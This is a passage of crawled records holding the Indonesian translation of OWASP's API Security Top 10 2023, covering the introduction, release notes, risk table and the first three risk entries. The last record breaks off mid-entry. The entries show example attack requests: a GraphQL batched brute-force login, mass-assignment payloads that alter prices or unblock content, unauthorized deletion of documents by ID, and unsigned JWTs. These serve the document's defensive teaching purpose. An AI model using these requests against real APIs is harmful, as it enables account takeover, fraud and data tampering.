{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0x03-introduction.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0x03-introduction.md", "content": "# Perkenalan\n\n## Selamat Datang di OWASP API Security Top 10 - 2023!\n\nSelamat datang di edisi kedua OWASP API Security Top 10!\n\nDokumen ini pertama kali dipublikasikan pada tahun 2019. Sejak saat itu, industri keamanan API berkembang dan menjadi lebih dewasa. Kami sungguh percaya bahwa usaha ini telah berkontribusi positif terhadap hal itu, karena telah diadopsi secara cepat sebagai referensi industri.\n\nAPI memainkan peranan penting di dalam arsitektur aplikasi modern. Namun karena inovasi memiliki kecepatan yang berbeda dibanding membuat kesadaran keamanan, kami percaya adalah penting untuk fokus menciptakan kesadaran atas kelemahan-kelemahan keamanan API umum.\n\nTujuan utama OWASP API Security Top 10 adalah mendidik mereka yang terlibat dalam pengembangan dan pengelolaan API, sebagai contoh, para pengembang, desainer, arsitek, manajer atau organisasi. Anda dapat mengetahui lebih lanjut tentang API Security\nProject dengan mengunjungi [halaman proyek][1].\n\nJika anda tidak mengenal seri OWASP top 10, kami merekomendasikan anda untuk memeriksa beberapa proyek top 10 berikut ini:\n\n* [OWASP Cloud-Native Application Security Top 10][2]\n* [OWASP Desktop App Security Top 10][3]\n* [OWASP Docker Top 10][4]\n* [OWASP Low-Code/No-Code Top 10][5]\n* [OWASP Machine Learning Security Top Ten][6]\n* [OWASP Mobile Top 10][7]\n* [OWASP TOP 10][8]\n* [OWASP Top 10 CI/CD Security Risks][9]\n* [OWASP Top 10 Client-Side Security Risks][10]\n* [OWASP Top 10 Privacy Risks][11]\n* [OWASP Serverless Top 10][12]\n\nTidak ada proyek yang menggantikan satu dengan lainnya: jika anda bekerja dengan aplikasi mobile yang didukung oleh API back-end, anda sebaiknya membaca kedua top 10 yang terkait. Hal yang sama juga berlaku bila anda bekerja dengan aplikasi web atau desktop yang menggunakan API.\n\nDalam bab [Metodologi dan Data][13], anda dapat membaca lebih lanjut bagaimana edisi ini dibuat. Untuk saat ini, kami menganjurkan setiap orang untuk berkontribusi dengan pertanyaan, komentar, dan ide Anda di repositori proyek GitHub kami [repositori GitHub][14] or\n[Mailing list][15].\n\n[1]: https://owasp.org/www-project-api-security/\n[2]: https://owasp.org/www-project-cloud-native-application-security-top-10/\n[3]: https://owasp.org/www-project-desktop-app-security-top-10/\n[4]: https://owasp.org/www-project-docker-top-10/\n[5]: https://owasp.org/www-project-top-10-low-code-no-code-security-risks/\n[6]: https://owasp.org/www-project-machine-learning-security-top-10/\n[7]: https://owasp.org/www-project-mobile-top-10/\n[8]: https://owasp.org/www-project-top-ten/\n[9]: https://owasp.org/www-project-top-10-ci-cd-security-risks/\n[10]: https://owasp.org/www-project-top-10-client-side-security-risks/\n[11]: https://owasp.org/www-project-top-10-privacy-risks/\n[12]: https://owasp.org/www-project-serverless-top-10/\n[13]: ./0xd0-about-data.md\n[14]: https://github.com/OWASP/API-Security\n[15]: https://groups.google.com/a/owasp.org/forum/#!forum/api-security-project\n", "timestamp": "2025-10-24T22:26:58.703727"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0x04-release-notes.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0x04-release-notes.md", "content": "# Catatan Rilis\n\nIni adalah edisi kedua OWASP API Security Top 10, tepat empat tahun setelah rilis pertama. Banyak perubahan terjadi dalam area keamanan API. Lalu lintas API meningkat dalam fase yang cepat, beberapa protokol API mendapatkan banyak daya tarik, berbagai solusi/vendor keamanan API telah bermunculan, dan tentu saja, para penyerang telah mengembangkan kemampuan dan teknik baru untuk menyerang API. Sudah saatnya untuk memperbarui daftar sepuluh risiko paling kritis keamanan API.\n\nDengan semakin matangnya industri keamanan API, untuk pertama kalinya, ada [panggilan publik untuk data][1]. Namun sayangnya, tidak ada data yang dikontribusikan, namun berdasarkan pengalaman tim proyek, tinjauan cermat spesialis keamanan API, dan masukan dari komunitas, kami membuat daftar baru ini. Dalam bagian \n[Metodologi dan Data][2], anda akan menemukan informasi rinci mengenai bagaimana versi ini dikembangkan. Informasi lebih rinci mengenai risiko keamanan silakan mengacu ke bagian\n[Risiko Keamanan API][3].\n\nOWASP API Security Top 10 2023 adalah dokumen kesadaran berwawasan ke depan untuk industri yang berkembang cepat. Dokumen ini tidak menggantikan TOP 10 lainnya. Dalam edisi ini:\n\n* Kami telah menggabungkan Paparan Data Berlebihan dan  Penugasan Massal dengan berfokus pada akar masalah yang sama: kegagalan validasi otorisasi tingkat properti obyek.\n* Kami lebih menekankan pada konsumsi sumber daya, daripada berfokus pada kecepatan mereka dihabiskan.\n* Kami telah membuat kategori baru \"Akses Tanpa Batas ke Aliran Bisnis Sensitif\" untuk mengatasi ancaman baru, termasuk ancaman yang dapat dimitigasi dengan menggunakan pembatasan. \n* Kami menambahkan \"Konsumsi API yang Tidak Aman\" untuk mengatasi sesuatu hal yang mulai kami jumpai: penyerang telah mulai menyasar layanan integrasi target, alih-alih menyerang API target secara langsung. Saat ini adalah saat yang tepat untuk mulai membuat kesadaran atas meningkatnya risiko ini.\n\nAPI memainkan peranan penting dalam arsitektur mikroservice modern, Single Page Applications (SPA), aplikasi mobile, IoT, dsb. OWASP API Security\nTop 10 adalah upaya yang dibutuhkan untuk menciptakan kesadaran mengenai isu-isu keamanan API modern.\n\nPembaruan ini hanya dimungkinkan berkat usaha besar beberapa sukarelawan yang tercantum dalam bagian  [Ucapan Terima Kasih][4] section.\n\nThank you!\n\n[1]: https://owasp.org/www-project-api-security/announcements/cfd/2022/\n[2]: ./0xd0-about-data.md\n[3]: ./0x10-api-security-risks.md\n[4]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:58.922864"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0x10-api-security-risks.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0x10-api-security-risks.md", "content": "# Risiko Keamanan API\n\n[Metodologi Pemeringkatan Risiko OWASP][1] digunakan untuk melakukan analisis risiko.\n\nTabel berikut merangkum istilah yang diasosiasikan dengan nilai risiko.\n\n| Agen Ancaman | Eksploitasi | Prevalensi Kelemahan | Deteksi Kelemahan | Dampak Teknikal | Dampak Bisnis |\n| :-: | :-: | :-: | :-: | :-: | :-: |\n| Spesifik API | Mudah : **3** | Tersebar luas **3** | Mudah **3** | Severe **3** | Spesifik Bisnis |\n| Spesifik API | Menengah: **2** | Umum **2** | Menengah **2** | Sedang **2** | Spesifik Bisnis |\n| Spesifik API | Sukar: **1** | Sukar **1** | Sukar **1** | Minor **1** | Spesifik Bisnis |\n\n**Catatan**: Pendekatan ini tidak mempertimbangkan kemungkinan agen ancaman, dan juga tidak mempertimbangkan berbagai rincian teknikal yang terkait dengan aplikasi anda. Semua faktor ini dapat secara signifikan mempengaruhi kemungkinan penyerang menemukan dan mengeksploitasi kerentanan tertentu. Pemeringkatan ini tidak mempertimbangkan dampak aktual terhadap bisnis anda. Organisasi anda perlu menentukan tingkat risiko keamanan aplikasi dan API yang dapat diterima berdasarkan budaya, industri, dan lingkungan regulasi anda.  OWASP API Security Top\n10 tidak bertujuan melakukan risiko analisis ini untuk anda. Oleh karena edisi ini bukan berdasarkan data, namun berdasarkan konsensus umum di antara anggota tim.\n\n## Referensi\n\n### OWASP\n\n* [Metodologi Pemeringkatan Risiko OWASP][1]\n* [Artikel tentang Pemodelan Ancaman/Risiko][2]\n\n### Eksternal\n\n* [ISO 31000: Risk Management Std][3]\n* [ISO 27001: ISMS][4]\n* [NIST Cyber Framework (US)][5]\n* [ASD Strategic Mitigations (AU)][6]\n* [NIST CVSS 3.0][7]\n* [Microsoft Threat Modeling Tool][8]\n\n[1]: https://owasp.org/www-project-risk-assessment-framework/\n[2]: https://owasp.org/www-community/Threat_Modeling\n[3]: https://www.iso.org/iso-31000-risk-management.html\n[4]: https://www.iso.org/isoiec-27001-information-security.html\n[5]: https://www.nist.gov/cyberframework\n[6]: https://www.asd.gov.au/infosec/mitigationstrategies.htm\n[7]: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator\n[8]: https://www.microsoft.com/en-us/download/details.aspx?id=49168\n", "timestamp": "2025-10-24T22:26:59.128350"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0x11-t10.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0x11-t10.md", "content": "# OWASP Top 10 Risiko Keamanan API – 2023\n\n| Risiko | Keterangan |\n| ---- | ----------- |\n| [API1:2023 - Otorisasi Level Objek yang Rusak][api1] | API cenderung memaparkan titik akhir yang menangani pengenal obyek, hal ini menciptakan sebuah permukaan serangan yang luas atas Kendali Akses Tingkat Obyek. Pemeriksaan otorisasi tingkat obyek perlu dipertimbangkan di setiap fungsi yang mengakses sumber data menggunakan ID pengguna. |\n| [API2:2023 - Otentikasi yang Rusak][api2] | Mekanisme otentikasi seringkali tidak diimplementasikan dengan tepat, hal ini memungkinkan penyerang untuk mengambil token otentikasi atau mengeksploitasi celah implementasi untuk mengambil identitas user lain secara sementara atau permanen. Membahayakan kemampuan sistem untuk mengeidentifikasi klien/pengguna, membahayakan keseluruhan keamanan API. |\n| [API3:2023 - Otorisasi Tingkat Properti Objek yang Rusak][api3] | Kategori ini menggabungkan [API3:2019 Pengungkapan Data Berlebihan][1] dan [API6:2019 - Penugasan Massal][2], berfokus pada akar masalah: tidak adanya atau tidak tepatnya validasi otorisasi pada tingkat properti obyek. Hal ini berakibat pengungkapan atau manipulasi informasi oleh pihak yang tidak berwenang. |\n| [API4:2023 - Konsumsi Sumber Daya yang Tidak Terbatas][api4] | Pemenuhan permintaan API membutuhkan sumber daya seperti lebar pita jaringan, CPU, memori, dan penyimpanan. Sumber daya lain seperti email/SMS/panggilan telpon atau validasi biometrik disediakan oleh para penyelenggara melalui integrasi API, dan dibayar berdasarkan jumlah permintaan. Serangan yang berhasil dapat menyebabkan Denial of Service atau meningkatnya biaya operasional. |\n| [API5:2023 - Otorisasi Tingkat Fungsi yang Rusak][api5] | Kebijakan kendali akses yang kompleks dengan hierarki, kelompok, dan peran yang berbeda, serta tidak jelasnya pemisahan fungsi administratif dan reguler, cenderung mengakibatkan terjadinya celah otorisasi. Dengan mengeksploitasi isu ini, penyerang dapat memperoleh akses ke sumber daya dan/atau fungsi administratif pengguna lain. |\n| [API6:2023 - Akses Tanpa Batas ke Aliran Bisnis Sensitif][api6] | API yang rentan terhadap risiko ini memaparkan alur bisnis - seperti membeli tiket, atau memberikan komentar - tanpa mengkompensasi bagaimana fungsionalitas tersebut dapat membahayakan bisnis bila digunakan secara berlebihan dengan menggunakan cara yang terotomatisasi. Hal ini tidak berarti disebabkan oleh kesalahan implementasi. |\n| [API7:2023 - Pemalsuan Permintaan Sisi Server][api7] | Celah Pemalsuan Permintaan Sisi Server (Server-Side Request Forgery - SSRF) dapat terjadi ketika API mengambil sumber daya jauh tanpa memvalidasi URI yang diberikan pengguna. Hal ini memungkinan penyerang memaksa aplikasi untuk mengirimkan permintaan ke tujuan yang tidak terduga, bahkan bila dilindungi oleh firewall atau VPN. |\n| [API8:2023 - Miskonfigurasi Keamanan][api8] | API dan sistem yang mendukung mereka biasanya berisikan konfigurasi yang kompleks, yang dimaksudkan untuk mempermudah penyesuaian API. Insinyur Software and DevOps dapat melewatkan konfigurasi ini, atau tidak mengikuti praktek keamanan terbaik, membuka pintu bagi beragam jenis serangan.  |\n| [API9:2023 - Pengelolaan Inventaris yang Tidak Tepat][api9] | API cenderung memaparkan lebih banyak titik akhir dibandingkan aplikasi web tradisional, membuat dokumentasi yang tepat dan terkini menjadi sangat penting. Inventori yang tepat mengenai host dan versi API yang diterapkan juga penting untuk memitigasi isu seperti API yang tidak lagi digunakan dan terbukanya titik akhir debug. |\n| [API10:2023 - Konsumsi API yang Tidak Aman][api10] | Pengembang software cenderung mempercayai data yang diterima dari API pihak ketiga daripada input pengguna, dan akibatnya cenderung mengadopsi standar keamanan yang lebih lemah. Dalam rangka membahayakan API, penyerang mentargetkan layanan pihak ketiga alih-alih berusaha menyerang target API secara langsung. |\n\n[1]: https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/\n[2]: https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/\n[3]: https://owasp.org/API-Security/editions/2019/en/0xa4-lack-of-resources-and-rate-limiting/\n[api1]: 0xa1-broken-object-level-authorization.md\n[api2]: 0xa2-broken-authentication.md\n[api3]: 0xa3-broken-object-property-level-authorization.md\n[api4]: 0xa4-unrestricted-resource-consumption.md\n[api5]: 0xa5-broken-function-level-authorization.md\n[api6]: 0xa6-unrestricted-access-to-sensitive-business-flows.md\n[api7]: 0xa7-server-side-request-forgery.md\n[api8]: 0xa8-security-misconfiguration.md\n[api9]: 0xa9-improper-inventory-management.md\n[api10]: 0xaa-unsafe-consumption-of-apis.md\n", "timestamp": "2025-10-24T22:26:59.239318"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0xa1-broken-object-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0xa1-broken-object-level-authorization.md", "content": "# API1:2023 Otorisasi Level Obyek yang Rusak \n\n| Agen ancaman/Vektor serangan | Kelemahan Keamanan | Dampak |\n| - | - | - |\n| Khusus API: **Mudah** dieksploitasi | **Luas** Prevalensi: **Mudah** Terdeteksi | **Sedang** Teknis: Spesifik Bisnis |\n| Penyerang dapat mengeksploitasi endpoint API yang rentan terhadap otorisasi level obyek yang rusak dengan memanipulasi ID obyek yang dikirim dalam permintaan. ID obyek bisa apa saja dari integer sekuensial, UUID, atau string generik. Terlepas dari tipe datanya, mereka mudah diidentifikasi dalam target permintaan (parameter path atau query string), header permintaan, atau bahkan sebagai bagian dari payload permintaan. | Masalah ini sangat umum dalam aplikasi berbasis API karena komponen server biasanya tidak sepenuhnya melacak keadaan klien, dan sebaliknya, lebih mengandalkan parameter seperti ID obyek, yang dikirim dari klien untuk memutuskan obyek mana yang akan diakses. Respons server biasanya cukup untuk mengetahui apakah permintaan berhasil. | Akses tanpa otorisasi ke obyek pengguna lain dapat mengakibatkan pengungkapan data ke pihak yang tidak berwenang, kehilangan data, atau manipulasi data. Dalam keadaan tertentu, akses tanpa otorisasi ke obyek juga dapat mengarah pada pengambilalihan akun total. |\n\n## Apakah API Rentan?\n\nOtorisasi level obyek adalah mekanisme kendali akses yang biasanya diimplementasikan di level kode untuk memvalidasi bahwa pengguna hanya dapat mengakses obyek yang seharusnya mereka miliki izin untuk mengaksesnya.\n\nSetiap endpoint API yang menerima ID obyek, dan melakukan tindakan apa pun pada obyek, harus menerapkan pemeriksaan otorisasi level obyek. Pemeriksaan tersebut harus memvalidasi bahwa pengguna yang login memiliki izin untuk melakukan tindakan yang diminta pada obyek yang diminta.\n\nKegagalan dalam mekanisme ini biasanya mengarah pada pengungkapan informasi yang tidak sah, modifikasi, atau penghancuran semua data.\n\nMembandingkan ID pengguna sesi saat ini (misalnya dengan mengekstraknya dari token JWT) dengan parameter ID rentan bukanlah solusi yang memadai untuk menyelesaikan Otorisasi Level obyek yang Rusak (BOLA). Pendekatan ini hanya bisa mengatasi sebagian kecil kasus. \n\nDalam kasus BOLA, memang dirancang bahwa pengguna akan memiliki akses ke endpoint/fungsi API yang rentan. Pelanggaran terjadi pada level obyek, dengan memanipulasi ID. Jika penyerang berhasil mengakses endpoint/fungsi API yang seharusnya tidak mereka akses - ini adalah kasus [Otorisasi Tingkat Fungsi yang Rusak][5] (BFLA) daripada BOLA.\n\n## Skenario Serangan Contoh \n\n### Skenario #1\n\nSebuah platform e-commerce untuk toko online (toko) menyediakan sebuah halaman berisi grafik pendapatan toko yang di-hosting. Dengan memeriksa permintaan browser, seorang penyerang dapat mengidentifikasi endpoint API yang digunakan sebagai sumber data untuk grafik tersebut dan polanya: `/shops/{shopName}/revenue_data.json`. Menggunakan endpoint API lainnya, penyerang dapat memperoleh daftar semua nama toko yang di-hosting. Dengan skrip sederhana untuk memanipulasi nama dalam daftar, mengganti `{shopName}` dalam URL, penyerang mendapatkan akses ke data penjualan ribuan toko e-commerce.\n\n### Skenario #2 \n\nSebuah produsen otomotif telah mengaktifkan kendali jarak jauh kendaraannya melalui API seluler untuk berkomunikasi dengan ponsel pengemudi. API memungkinkan pengemudi untuk memulai dan menghentikan mesin dan mengunci serta membuka kunci pintu dari jarak jauh. Sebagai bagian dari alur ini, pengguna mengirim Nomor Identifikasi Kendaraan (VIN) ke API.\nAPI gagal memvalidasi bahwa VIN mewakili kendaraan yang dimiliki pengguna yang login, yang menyebabkan kerentanan BOLA. Seorang penyerang dapat mengakses kendaraan yang bukan miliknya.\n\n### Skenario #3\n\nLayanan penyimpanan dokumen online memungkinkan pengguna untuk melihat, mengedit, menyimpan, dan menghapus dokumen mereka. Ketika dokumen pengguna dihapus, sebuah mutasi GraphQL dengan ID dokumen dikirim ke API.\n\n```\nPOST /graphql\n{\n  \"operationName\":\"deleteReports\",\n  \"variables\":{\n    \"reportKeys\":[\"<DOCUMENT_ID>\"]\n  },\n  \"query\":\"mutation deleteReports($siteId: ID!, $reportKeys: [String]!) {\n    {\n      deleteReports(reportKeys: $reportKeys)\n    }\n  }\"\n}\n```\n\nKarena dokumen dengan ID yang diberikan dihapus tanpa pemeriksaan izin lebih lanjut, pengguna mungkin dapat menghapus dokumen pengguna lain.\n\n## Cara Mencegah\n\n* Terapkan mekanisme otorisasi yang tepat yang mengandalkan kebijakan dan hierarki pengguna.\n* Gunakan mekanisme otorisasi untuk memeriksa apakah pengguna yang login memiliki akses untuk melakukan tindakan yang diminta pada catatan di setiap fungsi yang menggunakan input dari klien untuk mengakses catatan di basis data.  \n* Sebaiknya gunakan nilai acak dan tidak terduga sebagai GUID untuk ID catatan. \n* Tulis tes untuk mengevaluasi kerentanan mekanisme otorisasi. Jangan terapkan perubahan yang membuat tes gagal.\n\n## Referensi\n\n### OWASP\n\n* [Cheat Sheet Otorisasi][1]  \n* [Cheat Sheet Otomatisasi Pengujian Otorisasi][2]\n\n### Eksternal  \n\n* [CWE-285: Otorisasi Tidak Tepat][3]\n* [CWE-639: Otorisasi yang Dilewati Melalui Kunci yang Dikendalikan Pengguna][4]\n\n[1]: https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html\n[2]: https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Testing_Automation_Cheat_Sheet.html\n[3]: https://cwe.mitre.org/data/definitions/285.html\n[4]: https://cwe.mitre.org/data/definitions/639.html\n[5]: ./0xa5-broken-function-level-authorization.md\n", "timestamp": "2025-10-24T22:26:59.452403"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0xa2-broken-authentication.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0xa2-broken-authentication.md", "content": "# API2:2023 Autentikasi yang Rusak  \n\n| Agen ancaman/Vektor serangan | Kelemahan Keamanan | Dampak |\n| - | - | - |\n| Khusus API: **Mudah** dieksploitasi | **Umum** Prevalensi: **Mudah** Terdeteksi | **Parah** Teknis: Spesifik Bisnis |\n| Mekanisme autentikasi adalah target yang mudah bagi penyerang karena terpapar ke semua orang. Meskipun keterampilan teknis yang lebih tinggi mungkin dibutuhkan untuk mengeksploitasi beberapa masalah autentikasi, alat eksploitasi umumnya tersedia. | Kesalahpahaman insinyur perangkat lunak dan keamanan mengenai batasan autentikasi dan kerumitan implementasi bawaan menjadikan masalah autentikasi hal yang lazim. Metodologi untuk mendeteksi autentikasi yang rusak tersedia dan mudah dibuat. | Penyerang dapat memperoleh kendali penuh atas akun pengguna lain dalam sistem, membaca data pribadi mereka, dan melakukan tindakan sensitif atas nama mereka. Sistem kemungkinan besar tidak dapat membedakan tindakan penyerang dari tindakan pengguna yang sah. |\n\n## Apakah API Rentan? \n\nEndpoint dan alur autentikasi adalah aset yang perlu dilindungi. Selain itu, \"Lupa kata sandi / reset kata sandi\" harus diperlakukan sama dengan mekanisme autentikasi.\n\nSebuah API rentan bila:\n\n* Mengizinkan credential stuffing ketika penyerang menggunakan brute force dengan daftar nama pengguna dan kata sandi yang valid. \n* Mengizinkan penyerang melakukan serangan brute force pada akun pengguna yang sama, tanpa menyajikan mekanisme captcha/penguncian akun.\n* Mengizinkan kata sandi yang lemah. \n* Mengirim detail autentikasi sensitif, seperti token auth dan kata sandi di URL.\n* Memungkinkan pengguna merubah alamat email mereka, kata sandi saat ini, atau melakukan operasi sensitif lainnya tanpa meminta konfirmasi kata sandi.\n* Tidak memvalidasi keaslian token.  \n* Menerima token JWT yang tidak ditandatangani/lemah ditandatangani (`{\"alg\":\"none\"}`)\n* Tidak memvalidasi tanggal kadaluwarsa JWT. \n* Menggunakan kata sandi teks biasa, tidak dienkripsi, atau menggunakan hash yang lemah.\n* Menggunakan kunci enkripsi yang lemah.\n\nSelain itu, mikroservis itu rentan jika:\n\n* Mikroservis lain dapat mengaksesnya tanpa otentikasi\n* Menggunakan token lemah atau dapat diprediksi untuk memastikan otentikasi\n\n## Skenario Serangan Contoh\n\n## Skenario #1\n\nUntuk melakukan autentikasi pengguna, klien harus mengirimkan permintaan API seperti di bawah ini dengan kredensial pengguna:\n\n```\nPOST /graphql\n{\n  \"query\":\"mutation {\n    login (username:\\\"<username>\\\",password:\\\"<password>\\\") {\n      token\n    }\n   }\"\n}\n```\n\nJika kredensial valid, lalu token auth akan dikembalikan yang harus diberikan dalam permintaan berikutnya untuk mengidentifikasi pengguna. Upaya login dibatasi dengan pembatasan laju yang ketat: hanya tiga permintaan yang diizinkan per menit. \n\nUntuk melakukan brute force login dengan akun korban, aktor jahat memanfaatkan query batching GraphQL untuk mengatasi pembatasan tingkat permintaan, mempercepat serangan:\n\n```\nPOST /graphql\n[\n  {\"query\":\"mutation{login(username:\\\"victim\\\",password:\\\"password\\\"){token}}\"},\n  {\"query\":\"mutation{login(username:\\\"victim\\\",password:\\\"123456\\\"){token}}\"},\n  {\"query\":\"mutation{login(username:\\\"victim\\\",password:\\\"qwerty\\\"){token}}\"},\n  ...\n  {\"query\":\"mutation{login(username:\\\"victim\\\",password:\\\"123\\\"){token}}\"}, \n]\n```\n\n## Skenario #2\n\nUntuk memperbarui alamat email yang terkait dengan akun pengguna, klien harus mengirimkan permintaan API seperti berikut ini:\n\n```\nPUT /account\nAuthorization: Bearer <token>\n\n{ \"email\": \"<new_email_address>\" }\n```\n\nKarena API tidak mengharuskan pengguna untuk mengkonfirmasi identitas mereka dengan memberikan kata sandi saat ini, aktor jahat yang mampu menempatkan diri dalam posisi untuk mencuri token auth mungkin dapat mengambil alih akun korban dengan memulai alur kerja reset kata sandi setelah memperbarui alamat email akun korban.\n\n## Cara Mencegah\n\n* Pastikan Anda mengetahui semua alur kemungkinan untuk mengotentikasi API (mobile/web/tautan langsung yang mengimplementasikan otentikasi satu klik/dll.). Tanyakan pada insinyur Anda alur apa yang Anda lewatkan.\n* Bacalah tentang mekanisme autentikasi Anda. Pastikan Anda memahami apa dan bagaimana mereka digunakan. OAuth bukan otentikasi, dan demikian pula kunci API. \n* Jangan menciptakan ulang dalam otentikasi, pembuatan token, atau penyimpanan kata sandi. Gunakan standar.\n* Endpoint pemulihan kredensial/lupa kata sandi harus diperlakukan seperti endpoint login dalam hal brute force, pembatasan tingkat, dan perlindungan penguncian.\n* Haruskan otentikasi ulang untuk operasi sensitif (misalnya mengubah alamat email pemilik akun/nomor telepon 2FA). \n* Gunakan [Cheat Sheet Autentikasi OWASP][1].  \n* Jika memungkinkan, terapkan otentikasi multifaktor.\n* Terapkan mekanisme anti-brute force untuk memitigasi credential stuffing, serangan kamus, dan serangan brute force pada endpoint otentikasi Anda. Mekanisme ini harus lebih ketat dari mekanisme pembatasan tingkat biasa pada API Anda.  \n* Implementasikan mekanisme penguncian akun/captcha untuk mencegah serangan brute force terhadap pengguna tertentu. Terapkan pemeriksaan kata sandi lemah.  \n* Kunci API tidak boleh digunakan untuk otentikasi pengguna. Mereka hanya boleh digunakan untuk otentikasi [klien API][2].\n\n## Referensi \n\n### OWASP\n\n* [Authentication Cheat Sheet][1]\n* [Key Management Cheat Sheet][4]\n* [Credential Stuffing][5]\n\n### Eksternal\n\n* [CWE-204: Observable Response Discrepancy][6]\n* [CWE-307: Improper Restriction of Excessive Authentication Attempts][7]\n\n[1]: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html\n[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism(OTG-AUTHN-003)\n[3]: https://cloud.google.com/endpoints/docs/openapi/when-why-api-key\n[4]: https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html\n[5]: https://owasp.org/www-community/attacks/Credential_stuffing\n[6]: https://cwe.mitre.org/data/definitions/204.html\n[7]: https://cwe.mitre.org/data/definitions/307.html\n\n", "timestamp": "2025-10-24T22:26:59.658636"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/id/0xa3-broken-object-property-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/id/0xa3-broken-object-property-level-authorization.md", "content": "# API3:2023 Otorisasi Tingkat Properti Obyek yang Rusak\n\n| Agen ancaman/Vektor serangan | Kelemahan Keamanan | Dampak |\n| - | - | - |\n| Khusus API: **Mudah** dieksploitasi | **Umum** Prevalensi: **Mudah** Terdeteksi | **Sedang** Teknis: Spesifik Bisnis |\n| API cenderung mengekspos endpoint yang mengembalikan semua properti obyek. Hal ini khususnya berlaku untuk API REST. Untuk protokol lain seperti GraphQL, mungkin memerlukan permintaan yang dibuat untuk menentukan properti mana yang harus dikembalikan. Mengidentifikasi properti tambahan ini yang dapat dimanipulasi memerlukan lebih banyak upaya, tetapi ada beberapa alat otomatis yang tersedia untuk membantu tugas ini. | Memeriksa respons API sudah cukup untuk mengidentifikasi informasi sensitif dalam representasi obyek yang dikembalikan. Fuzzing biasanya digunakan untuk mengidentifikasi properti tambahan (tersembunyi). Apakah mereka dapat diubah adalah masalah pembuatan permintaan API dan menganalisis respons. Analisis efek samping mungkin diperlukan jika properti target tidak dikembalikan dalam respons API. | Akses tanpa otorisasi ke properti obyek privat/sensitif dapat mengakibatkan pengungkapan data, kehilangan data, atau kerusakan data. Dalam keadaan tertentu, akses tanpa otorisasi ke properti obyek dapat mengarah ke eskalasi hak istimewa atau pengambilalihan akun parsial/total. | \n\n## Apakah API Rentan?\n\nKetika mengizinkan pengguna mengakses obyek menggunakan endpoint API, penting untuk memvalidasi bahwa pengguna memiliki akses ke properti obyek tertentu yang mereka coba akses.\n\nSebuah endpoint API rentan jika:\n\n* Endpoint API memaparkan properti obyek yang dianggap sensitif dan tidak boleh dibaca oleh pengguna. (sebelumnya bernama: \"[Paparan Data Berlebihan][1]\")  \n* Endpoint API memungkinkan pengguna untuk mengubah, menambah/atau menghapus nilai properti obyek sensitif yang seharusnya tidak dapat diakses pengguna (sebelumnya bernama: \"[Penugasan Massal][2]\")\n\n## Skenario Serangan Contoh\n\n### Skenario #1\n\nSebuah aplikasi kencan memungkinkan pengguna melaporkan pengguna lain karena perilaku yang tidak pantas. Sebagai bagian dari alur ini, pengguna mengklik tombol \"laporkan\", dan memicu panggilan API berikut:\n\n```\nPOST /graphql\n{\n  \"operationName\":\"reportUser\",\n  \"variables\":{\n    \"userId\": 313,\n    \"reason\":[\"offensive behavior\"]\n  },\n  \"query\":\"mutation reportUser($userId: ID!, $reason: String!) {\n    reportUser(userId: $userId, reason: $reason) {\n      status\n      message\n      reportedUser {\n        id\n        fullName\n        recentLocation\n      }\n    }\n  }\"\n}\n```\n\nEndpoint API rentan karena memungkinkan pengguna terotentikasi memiliki akses ke properti obyek pengguna sensitif yang dilaporkan, seperti \"fullName\" dan \"recentLocation\" yang seharusnya tidak diakses oleh pengguna lain.\n\n### Skenario #2\n\nSebuah platform marketplace online, yang menawarkan satu jenis pengguna (\"host\") untuk menyewakan apartemen mereka ke jenis pengguna lain (\"tamu\"), mensyaratkan host untuk menerima pemesanan yang dibuat oleh tamu, sebelum membebankan biaya kepada tamu untuk menginap.\n\nSebagai bagian alur ini, sebuah panggilan API dikirim oleh host ke `POST /api/host/approve_booking` dengan payload sah berikut ini:\n\n```\n{\n  \"approved\": true,\n  \"comment\": \"Check-in setelah pukul 3 sore\" \n}\n```\n\nHost mengirimkan ulan permintaan yang sah, dan menambahkan payload berbahaya berikut: \n\n```\n{\n  \"approved\": true, \n  \"comment\": \"Check-in setelah pukul 3 sore\",\n  \"total_stay_price\": \"$1,000,000\"\n}\n```\n\nEndpoint API rentan karena tidak ada validasi bahwa host harus memiliki akses ke properti obyek internal - `total_stay_price`, dan tamu akan dikenakan biaya lebih dari yang seharusnya.\n\n### Skenario #3\n\nSebuah jejaring sosial yang didasarkan pada video pendek, menerapkan filter konten yang membatasi dan sensor yang ketat. Bahkan jika video yang diunggah diblokir, pengguna dapat mengubah deskripsi video menggunakan permintaan API berikut:\n\n```\nPUT /api/video/update_video\n\n{\n  \"description\": \"video lucu tentang kucing\" \n}\n```\n\nPengguna yang frustrasi dapat mengirimkan ulang permintaan yang sah, dan menambahkan payload berbahaya berikut:\n\n```\n{\n  \"description\": \"video lucu tentang kucing\",\n  \"blocked\": false  \n}\n```\n\nEndpoint API rentan karena tidak ada validasi apakah pengguna seharusnya memiliki akses ke properti obyek internal - `blocked`, dan pengguna dapat mengubah nilai dari `true` ke `false` dan membuka blokir konten mereka sendiri.\n\n## Cara Mencegah\n\n* Saat memaparkan obyek menggunakan endpoint API, selalu pastikan bahwa pengguna harus memiliki akses ke properti obyek yang Anda paparkan.\n* Hindari menggunakan metode generik 